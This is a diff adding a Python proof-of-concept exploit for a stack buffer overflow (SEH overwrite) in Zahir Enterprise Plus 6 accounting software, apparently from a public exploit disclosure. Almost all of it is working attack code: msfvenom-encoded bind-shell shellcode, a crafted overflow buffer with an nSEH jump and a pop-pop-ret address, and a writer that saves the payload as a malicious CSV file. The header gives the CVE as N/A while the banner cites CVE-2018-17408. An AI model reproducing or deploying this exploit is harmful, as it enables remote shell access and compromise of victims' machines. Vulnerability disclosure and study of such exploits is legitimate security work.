@@ -1,0 +1,86 @@
+# Exploit Title: Zahir Enterprise Plus 6 build 10b - Buffer Overflow (SEH)
+# Google Dork: -
+# Date: 2018-09-28
+# Exploit Author: modpr0be
+# Vendor Homepage: http://www.zahiraccounting.com/
+# Software Link: http://zahiraccounting.com/files/zahir-accounting-6-free-trial.zip
+# Version: 6 (build 10b) - Download here: http://zahirsoftware.com/zahirupdate/Zahir_SMB_6_Build10b%20-%20MultiUser.zip
+# Tested on: Windows 7 x86/64bit
+# CVE : N/A
+# Category: local & privilege escalation
+#
+# Description
+# Vulnerability occurs when the Zahir cannot handle large inputs and anomalies crafted CSV file. 
+# The Zahir main program failed to process the CR LF (Carriage Return Line Feed) characters which 
+# caused the Zahir main program to crash.
+#
+# Credits to f3ci, who found the vulnerability.
+#
+# Proof of Concept
+#!/usr/bin/python
+ 
+import struct
+ 
+# msfvenom -p windows/shell_bind_tcp -a x86 -b '\x00\x0a\x0d\x22\x2c' \
+# -n 20 -e x86/shikata_ga_nai -f python -v sc
+# we won't worry about the space, it's big enough!
+# badchars are 00,0a,0d,22,2c
+sc =  ""
+sc += "\x92\x91\xf5\x99\x98\xf5\xd6\x48\x48\x3f\x2f\x99\x4a"
+sc += "\x42\x9f\x2f\x42\x43\x43\x42\xb8\x8c\xa3\xb1\xa0\xdd"
+sc += "\xc0\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x53\x31\x43\x12"
+sc += "\x83\xc3\x04\x03\xcf\xad\x53\x55\x33\x59\x11\x96\xcb"
+sc += "\x9a\x76\x1e\x2e\xab\xb6\x44\x3b\x9c\x06\x0e\x69\x11"
+sc += "\xec\x42\x99\xa2\x80\x4a\xae\x03\x2e\xad\x81\x94\x03"
+sc += "\x8d\x80\x16\x5e\xc2\x62\x26\x91\x17\x63\x6f\xcc\xda"
+sc += "\x31\x38\x9a\x49\xa5\x4d\xd6\x51\x4e\x1d\xf6\xd1\xb3"
+sc += "\xd6\xf9\xf0\x62\x6c\xa0\xd2\x85\xa1\xd8\x5a\x9d\xa6"
+sc += "\xe5\x15\x16\x1c\x91\xa7\xfe\x6c\x5a\x0b\x3f\x41\xa9"
+sc += "\x55\x78\x66\x52\x20\x70\x94\xef\x33\x47\xe6\x2b\xb1"
+sc += "\x53\x40\xbf\x61\xbf\x70\x6c\xf7\x34\x7e\xd9\x73\x12"
+sc += "\x63\xdc\x50\x29\x9f\x55\x57\xfd\x29\x2d\x7c\xd9\x72"
+sc += "\xf5\x1d\x78\xdf\x58\x21\x9a\x80\x05\x87\xd1\x2d\x51"
+sc += "\xba\xb8\x39\x96\xf7\x42\xba\xb0\x80\x31\x88\x1f\x3b"
+sc += "\xdd\xa0\xe8\xe5\x1a\xc6\xc2\x52\xb4\x39\xed\xa2\x9d"
+sc += "\xfd\xb9\xf2\xb5\xd4\xc1\x98\x45\xd8\x17\x34\x4d\x7f"
+sc += "\xc8\x2b\xb0\x3f\xb8\xeb\x1a\xa8\xd2\xe3\x45\xc8\xdc"
+sc += "\x29\xee\x61\x21\xd2\x01\x2e\xac\x34\x4b\xde\xf8\xef"
+sc += "\xe3\x1c\xdf\x27\x94\x5f\x35\x10\x32\x17\x5f\xa7\x3d"
+sc += "\xa8\x75\x8f\xa9\x23\x9a\x0b\xc8\x33\xb7\x3b\x9d\xa4"
+sc += "\x4d\xaa\xec\x55\x51\xe7\x86\xf6\xc0\x6c\x56\x70\xf9"
+sc += "\x3a\x01\xd5\xcf\x32\xc7\xcb\x76\xed\xf5\x11\xee\xd6"
+sc += "\xbd\xcd\xd3\xd9\x3c\x83\x68\xfe\x2e\x5d\x70\xba\x1a"
+sc += "\x31\x27\x14\xf4\xf7\x91\xd6\xae\xa1\x4e\xb1\x26\x37"
+sc += "\xbd\x02\x30\x38\xe8\xf4\xdc\x89\x45\x41\xe3\x26\x02"
+sc += "\x45\x9c\x5a\xb2\xaa\x77\xdf\xc2\xe0\xd5\x76\x4b\xad"
+sc += "\x8c\xca\x16\x4e\x7b\x08\x2f\xcd\x89\xf1\xd4\xcd\xf8"
+sc += "\xf4\x91\x49\x11\x85\x8a\x3f\x15\x3a\xaa\x15"
+ 
+junk = "A" * 3041
+junk += '\n\r'
+junk += 'A' * 380
+junk += "\xeb\x08\x90\x90"	# nseh
+junk += struct.pack('<L',0x52016661) #seh pop ecx # pop ebp # ret 0x04 (C:\Program Files\Zahir Personal 6 - Demo Version\vclie100.bpl)
+junk += '\x90\x90\x90\x90'
+junk += sc
+junk += "D" * (5000-len(junk))
+
+print """
+#===============================================================================#
+|					   ____              __ 		             				|
+|					  / __/__  ___ ___  / /____ _______ _ 						|
+|					 _\ \/ _ \/ -_) _ \/ __/ -_) __/ _ `/						|
+|					/___/ .__/\__/_//_/\__/\__/_/  \_,_/ 						|
+|					   /_/                                          			|
+|                                                               				|
+|	Zahir Enterprise Plus 6 <= build 10b Stack Overflow Vulnerability (0day)	|
+|   	                      CVE-2018-17408            						|
+|       	   by modpr0be & f3ci (research[at]spentera.com)   					|
+#===============================================================================#
+"""
+print "[+] Preparing for file.."
+f = open('exploit.csv', 'w')
+print "[+] Writing exploit code on a CSV file.."
+f.write(junk)
+f.close()
+print "[+] Success writing file.. bring to Mr. Zahir."
